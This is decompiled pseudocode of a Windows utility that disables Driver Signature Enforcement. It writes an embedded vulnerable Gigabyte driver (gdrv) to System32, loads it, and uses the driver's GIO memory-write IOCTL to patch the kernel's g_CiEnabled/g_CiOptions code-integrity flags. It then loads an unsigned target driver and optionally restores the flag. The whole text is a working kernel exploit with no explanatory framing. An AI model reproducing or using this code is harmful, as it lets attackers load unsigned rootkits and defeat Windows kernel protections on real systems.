
Main function :
```
1400026f0    int64_t main()

1400026f0    {
1400026f0        void var_88;
140002700        int64_t rax_1 = __security_cookie ^ &var_88;
14000270d        HANDLE hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);
14000272b        sub_140001010("Do you want to disable DSE ?", SetConsoleTextAttribute(hConsoleOutput, FOREGROUND_RED));
140002745        sub_140001010(" | Type : Yes | \n", SetConsoleTextAttribute(hConsoleOutput, FOREGROUND_GREEN));
140002752        SetConsoleTextAttribute(hConsoleOutput, 0x7);
140002764        void var_28;
140002764        sub_140001420("%s", &var_28);
140002764        
140002792        for (int64_t i = 0; i != 4; )
140002792        {
140002780            char rax_2 = *(uint8_t*)(&var_28 + i);
140002784            i += 1;
140002784            
14000278c            if (rax_2 != *(uint8_t*)(i + 0x140004a43))
14000278c            {
140002796                for (int64_t j = 0; j != 4; )
1400027c6                {
1400027b0                    char rcx_3 = *(uint8_t*)(&var_28 + j);
1400027b4                    j += 1;
1400027b4                    
1400027bc                    if (rcx_3 != *(uint8_t*)(j + 0x140004b87))
1400027bc                        goto label_1400028ef;
1400027c6                }
1400027c6                
1400027bc                break;
14000278c            }
140002792        }
140002792        
1400027c8        HANDLE hTemplateFile = nullptr;
1400027d4        enum FILE_FLAGS_AND_ATTRIBUTES dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;
1400027e2        enum FILE_CREATION_DISPOSITION var_68_1 = CREATE_NEW;
1400027f7        int32_t lpNumberOfBytesWritten = 0;
1400027fb        HANDLE rax_3 = CreateFileW(u"C:\Windows\System32\Drivers\gdrv…", 0x10000000, FILE_SHARE_NONE, nullptr, var_68_1, dwFlagsAndAttributes, hTemplateFile);
1400027fb        
14000280d        if (GetLastError() == ERROR_FILE_EXISTS)
14000280d        {
14000284c            label_14000284c:
14000284c            NTSTATUS rax_6;
14000284c            int64_t rdx_4;
14000284c            rax_6 = sub_140002060();
140002858            void lpConsoleScreenBufferInfo;
140002858            enum CONSOLE_CHARACTER_ATTRIBUTES var_38;
140002858            
140002858            if (rax_6 >= STATUS_SUCCESS)
140002858            {
14000285f                HANDLE hConsoleOutput_1 = GetStdHandle(STD_OUTPUT_HANDLE);
140002870                BOOL rax_7;
140002870                rax_7 = GetConsoleScreenBufferInfo(hConsoleOutput_1, &lpConsoleScreenBufferInfo);
140002870                
140002878                if (rax_7)
140002889                    rdx_4 = SetConsoleTextAttribute(hConsoleOutput_1, (var_38 & 0xf0) + 2);
140002858            }
140002858            
140002896            sub_140001010("Driver loaded successfully\n", rdx_4);
1400028a0            HANDLE hConsoleOutput_2 = GetStdHandle(STD_OUTPUT_HANDLE);
1400028a0            
1400028b9            if (GetConsoleScreenBufferInfo(hConsoleOutput_2, &lpConsoleScreenBufferInfo))
1400028ca                SetConsoleTextAttribute(hConsoleOutput_2, (var_38 & 0xf0) + 7);
1400028ca            
1400028d7            DeleteFileW(u"C:\Windows\System32\Drivers\gdrv…");
14000280d        }
14000280d        else if (rax_3 != -1)
140002813        {
14000281e            var_68_1 = 0;
140002833            char rax_5 = WriteFile(rax_3, &data_140006040, 0x6650, &lpNumberOfBytesWritten, var_68_1);
14000283e            CloseHandle(rax_3);
14000283e            
140002846            if (rax_5)
140002846                goto label_14000284c;
140002813        }
140002813        
1400028ef        label_1400028ef:
1400028ef        __security_check_cookie(rax_1 ^ &var_88);
1400028fc        return 0;
1400026f0    }
```

```
140001010    int64_t sub_140001010(char* arg1, int64_t arg2)

140001010    {
140001010        _ArgList = arg2;
14000101a        int64_t r8;
14000101a        arg_18 = r8;
14000101f        int64_t r9;
14000101f        arg_20 = r9;
140001034        FILE* _Stream = __acrt_iob_func(1);
140001061        return __stdio_common_vfprintf(data_14000ce98, _Stream, arg1, nullptr, &_ArgList);
140001010    }
```

```
140002060    NTSTATUS sub_140002060()

140002060    {
140002060        void var_578;
140002078        int64_t rax_1 = __security_cookie ^ &var_578;
140002087        int32_t* DestinationString;
140002087        NTSTATUS result = sub_1400019a0(&DestinationString);
140002087        
14000208e        if (result >= STATUS_SUCCESS)
14000208e        {
1400020b9            HANDLE hConsoleOutput = GetStdHandle(STD_OUTPUT_HANDLE);
1400020d8            void var_510;
1400020d8            enum CONSOLE_CHARACTER_ATTRIBUTES var_508;
1400020d8            
1400020d8            if (GetConsoleScreenBufferInfo(hConsoleOutput, &var_510))
1400020ea                SetConsoleTextAttribute(hConsoleOutput, (var_508 & 0xf0) + 2);
1400020f9            wchar16 const* const rdx_3 = u"nt!g_CiEnabled";
140002100            int32_t* DestinationString_3 = DestinationString;
140002126            TEB* gsbase;
140002126            
140002126            if (gsbase->NtTib.Self->ProcessEnvironmentBlock->OSBuildNumber >= 0x23f0)
140002126                rdx_3 = u"CI!g_CiOptions";
140002126            
14000212a            sub_140001010("%ls at 0x%p.\n", rdx_3);
140002134            HANDLE hConsoleOutput_1 = GetStdHandle(STD_OUTPUT_HANDLE);
14000214c            void lpConsoleScreenBufferInfo_2;
14000214c            enum CONSOLE_CHARACTER_ATTRIBUTES var_4b8;
14000214c            
14000214c            if (GetConsoleScreenBufferInfo(hConsoleOutput_1, &lpConsoleScreenBufferInfo_2))
14000215d                SetConsoleTextAttribute(hConsoleOutput_1, (var_4b8 & 0xf0) + 7);
140002171            BOOLEAN var_544;
140002171            NTSTATUS result_1;
140002171            int64_t rdx_7;
140002171            result_1 = RtlAdjustPrivilege(0xa, 1, 0, &var_544);
140002171            
14000217b            if (result_1 >= STATUS_SUCCESS)
14000217b            {
1400021ad                void Buffer_1;
1400021ad                result = RtlGetFullPathName_UEx(u"C:\Windows\System32\Drivers\gdrv…", 0x208, &Buffer_1, nullptr, nullptr);
1400021ad                
1400021b5                if (result >= STATUS_SUCCESS)
1400021b5                {
1400021d7                    void Buffer;
1400021d7                    result = RtlGetFullPathName_UEx(u"C:\Windows\System32\Drivers\gdrv…", 0x208, &Buffer, nullptr, nullptr);
1400021d7                    
1400021df                    if (result >= STATUS_SUCCESS)
1400021df                    {
1400021f0                        result = sub_140001c00(&data_14000ceb0, &Buffer);
1400021f0                        
1400021f7                        if (result >= STATUS_SUCCESS)
1400021f7                        {
140002200                            int64_t SystemInformation = 8;
140002216                            NTSTATUS rax_5;
140002216                            int64_t rdx_10;
140002216                            rax_5 = NtQuerySystemInformation(0x67, &SystemInformation, 8, nullptr);
140002216                            
14000221e                            if (rax_5 < STATUS_SUCCESS)
140002229                                rdx_10 = sub_140001010("Failed to query code integrity s…", (uint64_t)rax_5);
140002229                            
140002236                            if (((int8_t)*(uint32_t*)((char*)SystemInformation)[4] & 3) == 1)
140002236                            {
140002274                                int64_t rcx_8;
140002274                                result = sub_140001c00(&data_14000d0c0, &Buffer_1);
140002274                                
14000227b                                if (result >= STATUS_SUCCESS)
14000227b                                {
14000228c                                    int32_t var_548;
14000228c                                    NTSTATUS result_3 = write_double_translated_ansi_nolock(rcx_8, DestinationString_3, 0, &var_548);
140002291                                    NTSTATUS result_2 = result_3;
140002291                                    
140002295                                    if (result_3 >= STATUS_SUCCESS)
140002295                                    {
1400022af                                        HANDLE hConsoleOutput_2 = GetStdHandle(STD_OUTPUT_HANDLE);
1400022bf                                        void lpConsoleScreenBufferInfo_3;
1400022bf                                        BOOL rax_7;
1400022bf                                        int64_t rdx_16;
1400022bf                                        rax_7 = GetConsoleScreenBufferInfo(hConsoleOutput_2, &lpConsoleScreenBufferInfo_3);
1400022c7                                        enum CONSOLE_CHARACTER_ATTRIBUTES var_4a0;
1400022c7                                        
1400022c7                                        if (rax_7)
1400022d8                                            rdx_16 = SetConsoleTextAttribute(hConsoleOutput_2, (var_4a0 & 0xf0) + 2);
1400022e5                                        int64_t rdx_18 = sub_140001010("Successfully disabled DSE.", rdx_16);
1400022f3                                        int32_t rdi_1 = var_548;
1400022f3                                        
140002302                                        if (gsbase->NtTib.Self->ProcessEnvironmentBlock->OSBuildNumber >= 0x23f0)
14000230d                                            rdx_18 = sub_140001010(" Original g_CiOptions value: 0x%…", (uint64_t)rdi_1);
14000230d                                        
140002319                                        sub_140001010(U"\n", rdx_18);
140002323                                        HANDLE hConsoleOutput_3 = GetStdHandle(STD_OUTPUT_HANDLE);
14000233b                                        void lpConsoleScreenBufferInfo_4;
14000233b                                        enum CONSOLE_CHARACTER_ATTRIBUTES var_488;
14000233b                                        
14000233b                                        if (GetConsoleScreenBufferInfo(hConsoleOutput_3, &lpConsoleScreenBufferInfo_4))
14000234c                                            SetConsoleTextAttribute(hConsoleOutput_3, (var_488 & 0xf0) + 7);
14000235d                                        void DestinationString_1;
14000235d                                        RtlInitUnicodeString(&DestinationString_1, &data_14000ceb0);
140002367                                        int32_t rax_10 = NtLoadDriver(&DestinationString_1);
14000236f                                        void lpConsoleScreenBufferInfo;
14000236f                                        enum CONSOLE_CHARACTER_ATTRIBUTES var_520;
14000236f                                        void lpConsoleScreenBufferInfo_1;
14000236f                                        enum CONSOLE_CHARACTER_ATTRIBUTES var_4f0;
14000236f                                        
14000236f                                        if (rax_10 >= 0)
14000236f                                        {
140002463                                            HANDLE hConsoleOutput_6 = GetStdHandle(STD_OUTPUT_HANDLE);
140002474                                            BOOL rax_15;
140002474                                            int64_t rdx_31;
140002474                                            rax_15 = GetConsoleScreenBufferInfo(hConsoleOutput_6, &lpConsoleScreenBufferInfo);
140002474                                            
14000247c                                            if (rax_15)
14000248e                                                rdx_31 = SetConsoleTextAttribute(hConsoleOutput_6, (var_520 & 0xf0) + 2);
14000248e                                            
14000249b                                            sub_140001010("Target driver loaded successfull…", rdx_31);
1400024a5                                            HANDLE hConsoleOutput_7 = GetStdHandle(STD_OUTPUT_HANDLE);
1400024a5                                            
1400024bd                                            if (GetConsoleScreenBufferInfo(hConsoleOutput_7, &lpConsoleScreenBufferInfo_1))
1400024ce                                                SetConsoleTextAttribute(hConsoleOutput_7, (var_4f0 & 0xf0) + 7);
14000236f                                        }
14000236f                                        else if (rax_10 != 0xc000010e)
140002457                                            sub_140001010("Failed to load target driver: %0…", (uint64_t)rax_10);
14000237a                                        else
14000237a                                        {
14000238b                                            void DestinationString_2;
14000238b                                            RtlInitUnicodeString(&DestinationString_2, &data_14000ceb0);
140002395                                            int32_t rax_11 = NtUnloadDriver(&DestinationString_2);
140002395                                            
14000239d                                            if (rax_11 >= 0)
14000239d                                            {
1400023be                                                RtlInitUnicodeString(&var_510, &data_14000ceb0);
1400023c9                                                int32_t rax_12 = NtLoadDriver(&var_510);
1400023d1                                                int64_t rdx_24;
1400023d1                                                
1400023d1                                                if (rax_12 >= 0)
1400023d1                                                {
1400023e8                                                    HANDLE hConsoleOutput_4 = GetStdHandle(STD_OUTPUT_HANDLE);
1400023f8                                                    BOOL rax_13;
1400023f8                                                    rax_13 = GetConsoleScreenBufferInfo(hConsoleOutput_4, &lpConsoleScreenBufferInfo_1);
1400023f8                                                    
140002400                                                    if (rax_13)
140002411                                                        rdx_24 = SetConsoleTextAttribute(hConsoleOutput_4, (var_4f0 & 0xf0) + 2);
1400023d1                                                }
1400023d1                                                else
1400023dc                                                    rdx_24 = sub_140001010("Failed to reload target driver: …", (uint64_t)rax_12);
1400023dc                                                
14000241e                                                sub_140001010("Succesfully reloaded target driv…", rdx_24);
140002428                                                HANDLE hConsoleOutput_5 = GetStdHandle(STD_OUTPUT_HANDLE);
140002428                                                
140002441                                                if (GetConsoleScreenBufferInfo(hConsoleOutput_5, &lpConsoleScreenBufferInfo))
1400024ce                                                    SetConsoleTextAttribute(hConsoleOutput_5, (var_520 & 0xf0) + 7);
14000239d                                            }
14000239d                                            else
1400023a8                                                sub_140001010("Target driver is already loaded,…", (uint64_t)rax_11);
14000237a                                        }
1400024e5                                        label_1400024e5:
1400024e5                                        HANDLE hConsoleOutput_8 = GetStdHandle(STD_OUTPUT_HANDLE);
1400024f6                                        BOOL rax_17;
1400024f6                                        int64_t rdx_35;
1400024f6                                        rax_17 = GetConsoleScreenBufferInfo(hConsoleOutput_8, &lpConsoleScreenBufferInfo);
1400024f6                                        
1400024fe                                        if (rax_17)
140002510                                            rdx_35 = SetConsoleTextAttribute(hConsoleOutput_8, (var_520 & 0xf0) + 9);
140002510                                        
14000251d                                        sub_140001010("Are you ready to ( re-enable DSE…", rdx_35);
140002527                                        HANDLE hConsoleOutput_9 = GetStdHandle(STD_OUTPUT_HANDLE);
140002527                                        
140002540                                        if (GetConsoleScreenBufferInfo(hConsoleOutput_9, &lpConsoleScreenBufferInfo))
140002552                                            SetConsoleTextAttribute(hConsoleOutput_9, (var_520 & 0xf0) + 7);
140002552                                        
140002563                                        char var_448;
140002563                                        int64_t rdx_40 = sub_140001420("%9s", &var_448);
140002578                                        char var_447;
140002578                                        char var_446;
140002578                                        
140002578                                        if (var_448 == 0x6e && var_447 == 0x6f && !var_446)
140002578                                        {
140002581                                            sub_140001010("Waiting for your confirmation...…", rdx_40);
14000258b                                            Sleep(0xbb8);
140002578                                        }
140002578                                        
1400025b5                                        int64_t i;
1400025b5                                        
1400025b5                                        for (i = 0; i != 4; )
1400025b5                                        {
1400025a0                                            char rax_19 = (&var_448)[i];
1400025a4                                            i += 1;
1400025a4                                            
1400025ab                                            if (rax_19 != *(uint8_t*)(i + 0x140004a43))
1400025ab                                                goto label_1400024e5;
1400025b5                                        }
1400025b5                                        
1400025c2                                        NTSTATUS result_4 = write_double_translated_ansi_nolock(i, DestinationString, rdi_1, nullptr);
1400025c7                                        result_2 = result_4;
1400025c7                                        
1400025cb                                        if (result_4 >= STATUS_SUCCESS)
1400025cb                                        {
1400025e4                                            HANDLE hConsoleOutput_10 = GetStdHandle(STD_OUTPUT_HANDLE);
1400025f4                                            void lpConsoleScreenBufferInfo_5;
1400025f4                                            BOOL rax_20;
1400025f4                                            int64_t rdx_44;
1400025f4                                            rax_20 = GetConsoleScreenBufferInfo(hConsoleOutput_10, &lpConsoleScreenBufferInfo_5);
1400025fc                                            enum CONSOLE_CHARACTER_ATTRIBUTES var_470;
1400025fc                                            
1400025fc                                            if (rax_20)
14000260d                                                rdx_44 = SetConsoleTextAttribute(hConsoleOutput_10, (var_470 & 0xf0) + 2);
14000261a                                            sub_140001010("Successfully re-enabled DSE.\n", rdx_44);
140002624                                            HANDLE hConsoleOutput_11 = GetStdHandle(STD_OUTPUT_HANDLE);
14000263c                                            void lpConsoleScreenBufferInfo_6;
14000263c                                            enum CONSOLE_CHARACTER_ATTRIBUTES var_458;
14000263c                                            
14000263c                                            if (GetConsoleScreenBufferInfo(hConsoleOutput_11, &lpConsoleScreenBufferInfo_6))
14000264d                                                SetConsoleTextAttribute(hConsoleOutput_11, (var_458 & 0xf0) + 7);
1400025cb                                        }
1400025cb                                        else
1400025cb                                        {
1400025d6                                            sub_140001010("WARNING: failed to re-enable DSE…", (uint64_t)result_4);
1400025db                                            result_2 = STATUS_SUCCESS;
1400025cb                                        }
1400025cb                                        
14000265f                                        RtlInitUnicodeString(&DestinationString, &data_14000d0c0);
14000266a                                        NtUnloadDriver(&DestinationString);
14000267e                                        SHDeleteKeyW(-0xffffffff80000002, &data_14000d0e4);
14000267e                                        
140002686                                        if (result_2 < STATUS_SUCCESS)
140002696                                            SHDeleteKeyW(-0xffffffff80000002, &data_14000ced4);
140002295                                    }
140002295                                    else
140002295                                    {
1400022a0                                        sub_140001010("Failed to disable DSE through Gi…", (uint64_t)result_3);
140002696                                        SHDeleteKeyW(-0xffffffff80000002, &data_14000ced4);
140002295                                    }
140002295                                    
1400026ad                                    RtlAdjustPrivilege(0xa, var_544, 0, &var_544);
1400026b3                                    result = result_2;
14000227b                                }
140002236                            }
140002236                            else
140002236                            {
14000223f                                sub_140001010("WARNING: CI is already disabled!…", rdx_10);
140002250                                RtlInitUnicodeString(&DestinationString, &data_14000ceb0);
14000225b                                result = NtLoadDriver(&DestinationString);
140002236                            }
1400021f7                        }
1400021df                    }
1400021b5                }
14000217b            }
14000217b            else
14000217b            {
140002184                sub_140001010("Fatal error: failed to acquire S…", rdx_7);
1400026b3                result = result_1;
14000217b            }
14000208e        }
14000208e        
1400026df        __security_check_cookie(rax_1 ^ &var_578);
1400026ec        return result;
140002060    }
```

```
140001d80    uint64_t write_double_translated_ansi_nolock(int64_t arg1, int32_t* arg2, int32_t arg3, int32_t* arg4)

140001d80    {
140001d80        void var_138;
140001da3        int64_t rax_1 = __security_cookie ^ &var_138;
140001dad        int32_t var_98 = arg3;
140001dad        
140001dba        if (arg4)
140001dbc            *(uint32_t*)arg4 = 0;
140001dbc        
140001dbf        uint32_t EaLength = 0;
140001dc8        int64_t EaBuffer = 0;
140001dd4        enum NTCREATEFILE_CREATE_OPTIONS var_f8 = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT;
140001de3        int32_t DestinationString = 0x180016;
140001dea        int32_t rsi = 1;
140001def        wchar16 const* const var_88 = u"\Device\GIO";
140001df3        enum NTCREATEFILE_CREATE_DISPOSITION CreateDisposition = FILE_OPEN;
140001dfb        enum FILE_SHARE_MODE var_108 = FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE;
140001e07        enum FILE_FLAGS_AND_ATTRIBUTES FileAttributes = FILE_ATTRIBUTE_NORMAL;
140001e14        int64_t* AllocationSize = nullptr;
140001e1e        int32_t ObjectAttributes = 0x30;
140001e25        int64_t var_c8 = 0;
140001e29        int32_t* var_c0 = &DestinationString;
140001e2d        int32_t var_b8 = 0x40;
140001e34        int128_t var_b0 = {0};
140001e41        HANDLE FileHandle_1;
140001e41        void IoStatusBlock_2;
140001e41        NTSTATUS rbx_1;
140001e41        
140001e41        if (NtCreateFile(&FileHandle_1, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock_2, AllocationSize, FileAttributes, var_108, CreateDisposition, var_f8, EaBuffer, EaLength) >= STATUS_SUCCESS)
140001e41        {
140001f2d            label_140001f2d:
140001f2d            TEB* gsbase;
140001f2d            uint16_t OSBuildNumber = gsbase->NtTib.Self->ProcessEnvironmentBlock->OSBuildNumber;
140001f2d            
140001f39            if (OSBuildNumber >= 0x23f0)
140001f39                rsi = 4;
140001f39            
140001f40            char var_a0 = var_98;
140001f40            
140001f46            if (!arg4)
140001f46                goto label_140001fa9;
140001f46            
140001f48            HANDLE FileHandle = FileHandle_1;
140001f50            EaBuffer = 0;
140001f58            var_f8 = 0;
140001f60            int32_t var_9c;
140001f60            int32_t* var_80 = &var_9c;
140001f66            uint32_t InputBufferLength = 0x18;
140001f6e            var_108 = &var_80;
140001f77            uint32_t IoControlCode = 0xc3502808;
140001f7f            int128_t IoStatusBlock_1;
140001f7f            struct IO_STATUS_BLOCK* IoStatusBlock = &IoStatusBlock_1;
140001f84            var_9c = 0;
140001f88            int32_t* var_78_1 = arg2;
140001f8c            int32_t var_70_1 = rsi;
140001f8f            NTSTATUS rax_7 = NtDeviceIoControlFile(FileHandle, nullptr, nullptr, nullptr, IoStatusBlock, IoControlCode, var_108, InputBufferLength, var_f8, EaBuffer);
140001f95            rbx_1 = rax_7;
140001f95            
140001f99            if (rax_7 >= STATUS_SUCCESS)
140001f99            {
140001fa7                *(uint32_t*)arg4 = var_9c;
140001fa9                label_140001fa9:
140001fa9                EaBuffer = 0;
140001fb2                var_f8 = 0;
140001fb7                int32_t* rax_9 = &var_98;
140001fbe                var_80 = arg2;
140001fc6                int32_t var_70_2 = rsi;
140001fc9                IoStatusBlock_1 = {0};
140001fc9                
140001fcd                if (OSBuildNumber < 0x23f0)
140001fcd                    rax_9 = &var_a0;
140001fcd                
140001fd5                int32_t* var_78_2 = rax_9;
140001fee                var_108 = &var_80;
140002004                rax_7 = NtDeviceIoControlFile(FileHandle_1, nullptr, nullptr, nullptr, &IoStatusBlock_1, 0xc3502808, var_108, 0x18, var_f8, EaBuffer);
14000200a                rbx_1 = rax_7;
14000200a                
14000200e                if (rax_7 < STATUS_SUCCESS)
140002019                    sub_140001010("NtDeviceIoControlFile(IOCTL_GIO_…", (uint64_t)rax_7);
140001f99            }
140001f99            else
140002019                sub_140001010("NtDeviceIoControlFile(IOCTL_GIO_…", (uint64_t)rax_7);
140002019            
140002022            NtClose(FileHandle_1);
140001e41        }
140001e41        else
140001e41        {
140001e52            RtlInitUnicodeString(&DestinationString, &data_14000d0c0);
140001e5c            NTSTATUS rax_3 = NtLoadDriver(&DestinationString);
140001e62            rbx_1 = rax_3;
140001e62            
140001e66            if (rax_3 >= STATUS_SUCCESS)
140001e66            {
140001e83                uint32_t EaLength_1 = 0;
140001e8c                EaBuffer = 0;
140001e95                var_f8 = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT;
140001ea1                enum NTCREATEFILE_CREATE_DISPOSITION CreateDisposition_1 = FILE_OPEN;
140001ea9                var_108 = FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE;
140001eb4                enum FILE_FLAGS_AND_ATTRIBUTES FileAttributes_1 = FILE_ATTRIBUTE_NORMAL;
140001ec1                int64_t* AllocationSize_1 = nullptr;
140001ec6                DestinationString = 0x180016;
140001ecd                wchar16 const* const var_88_1 = u"\Device\GIO";
140001ed1                ObjectAttributes = 0x30;
140001ed8                int64_t var_c8_1 = 0;
140001edc                int32_t* var_c0_1 = &DestinationString;
140001ee0                int32_t var_b8_1 = 0x40;
140001ee7                int128_t var_b0_1 = {0};
140001eec                NTSTATUS rax_4 = NtCreateFile(&FileHandle_1, SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock_2, AllocationSize_1, FileAttributes_1, var_108, CreateDisposition_1, var_f8, EaBuffer, EaLength_1);
140001ef2                rbx_1 = rax_4;
140001ef2                
140001ef6                if (rax_4 >= STATUS_SUCCESS)
140001ef6                    goto label_140001f2d;
140001ef6                
140001f06                sub_140001010("Failed to obtain handle to devic…", &DestinationString);
140001e66            }
140001e66            else
140001e79                sub_140001010("Failed to load driver service %l…", &data_14000d0c0);
140001e41        }
140001e41        
140002031        __security_check_cookie(rax_1 ^ &var_138);
140002050        return (uint64_t)rbx_1;
140001d80    }
```